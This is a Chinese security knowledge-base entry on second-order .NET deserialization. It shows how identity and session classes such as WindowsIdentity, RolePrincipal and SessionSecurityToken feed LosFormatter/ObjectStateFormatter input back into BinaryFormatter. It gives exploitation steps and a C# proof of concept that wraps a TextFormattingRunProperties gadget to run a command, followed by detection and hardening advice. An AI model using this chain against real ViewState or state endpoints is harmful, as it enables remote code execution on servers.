---
id: web-dotnet-deser-losformatter-objectstateformatter-claims-identity-second-order
title: LosFormatter/ObjectStateFormatter 二次反序列化：ClaimsIdentity/WindowsIdentity/RolePrincipal/SessionSecurityToken 等类在反序列化构造函数中再次 BinaryFormatter.Deserialize
type: scenario
domain: web
path: web/dotnet/deserialization
technique: losformatter-objectstateformatter-claims-identity-second-order
tags:
- dotnet
- losformatter
- objectstateformatter
- binaryformatter
- deserialization
- claimsidentity
- windowsidentity
- roleprincipal
- sessionsecuritytoken
- gadget
- second-order
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V670
  verified_at: '2026-11-13T10:13:42+08:00'
  notes: 已对照 img13-23、img27-28 核对 ClaimsIdentity/WindowsIdentity/RolePrincipal/WindowsPrincipal/SessionSecurityToken/SessionViewStateHistoryItem 的二次反序列化键与调用点及 PoC；m_bootstrapContext(object 字段) 利用为文章文字描述；未复现。
url: /docs/web/dotnet/deserialization/web-dotnet-deser-losformatter-objectstateformatter-claims-identity-second-order/
draft: false
kb_aliases:
- LosFormatter 二次反序列化
- ObjectStateFormatter 二次反序列化
- ClaimsIdentity gadget
- WindowsIdentity gadget
- RolePrincipal gadget
- SessionSecurityToken gadget
- SessionViewStateHistoryItem
- System.Security.ClaimsIdentity.bootstrapContext
- ysoserial ClaimsIdentity
---

## 一句话结论

LosFormatter/ObjectStateFormatter 在序列化 `object` 类型字段时会退化为 BinaryFormatter token（Token_BinarySerialized），而 `ClaimsIdentity`、`WindowsIdentity`、`WindowsClaimsIdentity`、`RolePrincipal`、`WindowsPrincipal`、`SessionSecurityToken`、`SessionViewStateHistoryItem` 等类的自定义反序列化逻辑又会把 SerializationInfo 里的 base64 字符串/object 字段再次交给 BinaryFormatter（或 LosFormatter）反序列化；把 TextFormattingRunProperties 等 gadget 填进这些字段，即可在只暴露 LosFormatter/ObjectStateFormatter 入口的场景中触发内层 BinaryFormatter RCE。

## 原理

- **LosFormatter/ObjectStateFormatter 的底层行为**：LosFormatter（System.Web.UI，WebForms 视图状态）与 ObjectStateFormatter 用于序列化对象状态；遇到 `object` 类型值时使用 "Token_BinarySerialized"，即底层调用 BinaryFormatter 序列化/反序列化该值。因此外层 formatter 本身就会把某些字段作为 BinaryFormatter 流消费。
- **为什么直接放 ObjectDataProvider 不行**：文章指出 ObjectDataProvider 不支持 LosFormatter；但 TextFormattingRunProperties 等 BinaryFormatter gadget 可以。于是攻击路径变成"外层 LosFormatter 流携带一个二次反序列化载体类，载体类再把内层 TFRP 交给 BinaryFormatter"。
- **载体类与触发点**（共同模式：反序列化构造函数/OnDeserialized 回调信任 SerializationInfo 中的"内部已序列化状态"）：
  - `ClaimsIdentity`：① `m_bootstrapContext` 是 `object` 字段且未标 NonSerialized，ObjectStateFormatter 会用 BinaryFormatter token 还原它——直接把 TFRP 对象赋给该字段即可；② `m_serializedClaims`（string）在 `OnDeserializedMethod` 中进入 `DeserializeClaims`，`Convert.FromBase64String` 后 `new BinaryFormatter().Deserialize(...)`（文章 img13/16/27）。
  - `WindowsIdentity`：实现 ISerializable，反序列化构造函数按 SerializationInfo 键 `System.Security.ClaimsIdentity.actor`、`System.Security.ClaimsIdentity.bootstrapContext`、`System.Security.ClaimsIdentity.claims` 读取；前两者 base64 解码后走 BinaryFormatter.Deserialize，`claims` 走 `DeserializeClaims`（img14/15/16）。
  - `WindowsClaimsIdentity`：`_actor` 字段在反序列化构造函数中经 `DeserializeActor` → BinaryFormatter；但该类所在程序集不在 GAC，限制较大（img17）。
  - `RolePrincipal`：继承 `ClaimsPrincipal`；反序列化构造函数把 `System.Security.ClaimsPrincipal.Identities` 的值交给 `ClaimsPrincipal.DeserializeIdentities`，其中先 BinaryFormatter 反序列化 `List<string>`，再对每个 base64 identity 再次 BinaryFormatter.Deserialize（img18-20、27-28）。
  - `WindowsPrincipal`：字段 `m_identity` 为 `WindowsIdentity`，反序列化时触发上述 WindowsIdentity 链（文章 payload 用 `WindowsIdentity.GetCurrent()` + `Actor.BootstrapContext = TFRP`）。
  - `SessionSecurityToken`：反序列化构造函数调用 `ReadIdentity`，把 `BootstrapToken` 标签内容的 base64 解码后交给 `BinaryFormatter.Deserialize`（img21/22）。
  - `SessionViewStateHistoryItem`（SessionViewState 内部类）：反序列化构造函数取 `info.GetString("s")`，非空则 `new LosFormatter().Deserialize(input)`，形成二次 LosFormatter 反序列化（img23）。
- **为什么成立**：这些类型是 .NET 身份/会话体系的一部分，设计上需要把"已序列化的身份数据"从一个 SerializationInfo 搬到另一个序列化格式；它们默认这些字符串/base64 是可信的，于是成为把外层 formatter 输入转成内层 BinaryFormatter 输入的桥。

## 触发条件

- 入口能反序列化 LosFormatter/ObjectStateFormatter 数据（如未启用 MAC 的 ViewState、业务自定义的状态字段），或外层 BinaryFormatter 可直接构造这些 identity 类。
- 内层 gadget 依赖满足（TFRP 需 Microsoft.PowerShell.Editor.dll）。
- 目标 .NET Framework 具备 System.Security.Claims（.NET 4.5+ 默认）、System.Web（LosFormatter）等程序集。
- 反序列化端未禁用这些类型或未做类型白名单。

## 利用步骤

1. 生成内层 payload：BinaryFormatter 序列化 TFRP（`cmd /c <命令>`），得到字节并 base64。
2. 构造外层载体：按目标类填写 SerializationInfo/字段，例如 `WindowsIdentity` 的 actor/bootstrapContext/claims 键、`RolePrincipal` 的 `System.Security.ClaimsPrincipal.Identities`、`SessionSecurityToken` 的 `BootstrapToken`。
3. 用 LosFormatter/ObjectStateFormatter（或 BinaryFormatter）序列化外层对象并投递。
4. 外层反序列化时载体类再次 BinaryFormatter.Deserialize → TFRP → `XamlReader.Parse` → 命令执行。

## PoC

```csharp
// 内层：TFRP 字节 -> base64
string b64;
using (var ms = new MemoryStream())
{
    new BinaryFormatter().Serialize(ms, new TextFormattingRunPropertiesMarshal("calc"));
    b64 = Convert.ToBase64String(ms.ToArray());
}

// 外层：WindowsIdentity 的 actor/bootstrapContext/claims 三个键
[Serializable]
public class WindowsIdentityIdentityMarshal : ISerializable
{
    private readonly string _b64;
    public WindowsIdentityIdentityMarshal(string b64) { _b64 = b64; }
    public void GetObjectData(SerializationInfo info, StreamingContext context)
    {
        info.SetType(typeof(System.Security.Principal.WindowsIdentity));
        info.AddValue("System.Security.ClaimsIdentity.actor", _b64);
        info.AddValue("System.Security.ClaimsIdentity.bootstrapContext", _b64);
        info.AddValue("System.Security.ClaimsIdentity.claims", _b64);
    }
}

// 投递
var lf = new LosFormatter();
using (var ms = new MemoryStream())
{
    lf.Serialize(ms, new WindowsIdentityIdentityMarshal(b64));
    ms.Position = 0;
    lf.Deserialize(ms); // 触发内层 BinaryFormatter -> TFRP
}
```

## 变体与关联

- 变体：`RolePrincipal`（`System.Security.ClaimsPrincipal.Identities` 键）、`ClaimsIdentity`（`m_bootstrapContext` object 字段或 `m_serializedClaims` 回调）、`WindowsPrincipal`（`m_identity` 字段）、`WindowsClaimsIdentity`（`_actor`，非 GAC 限制大）、`SessionSecurityToken`（`BootstrapToken`）、`SessionViewStateHistoryItem`（`s` 字段二次 LosFormatter）。
- 关联：[[web-dotnet-deser-textformattingrunproperties-xamlreader-odp-gadget]]（内层载荷）、[[web-dotnet-deser-typeconfusedelegate-sortedset-delegate-confusion]]（`ClaimsPrincipal` 载体同样能承载 SortedSet）、[[web-dotnet-deser-viewstate-machinekey-textformattingrunproperties]]（ViewState 入口 + MachineKey）、[[web-dotnet-deser-activitysurrogateselector-linq-assembly-load-gadget]]（AxHost.State 二段载体）。
- 边界：启用 ViewState MAC 且无 MachineKey 时 ViewState 入口不可用；目标缺少对应身份程序集时换其他载体。

## 检测与防御

- 检测：反序列化流中出现 `ClaimsIdentity`、`WindowsIdentity`、`RolePrincipal`、`SessionSecurityToken`、`SessionViewStateHistoryItem` 等类型名及 `System.Security.ClaimsIdentity.*` 键；调用栈呈 `ObjectStateFormatter/LosFormatter.Deserialize → <载体类>构造函数 → BinaryFormatter.Deserialize` 的二次反序列化形态。
- 修复：禁用 `BinaryFormatter`；对 ViewState 启用并保护 MachineKey（`enableViewStateMac=true`、`ViewStateEncryptionMode=Always`）；不要反序列化不可信的状态对象。
- 加固：升级 .NET Framework；对身份/会话类做类型白名单；WAF/EDR 检测上述类型名与嵌套反序列化调用栈。
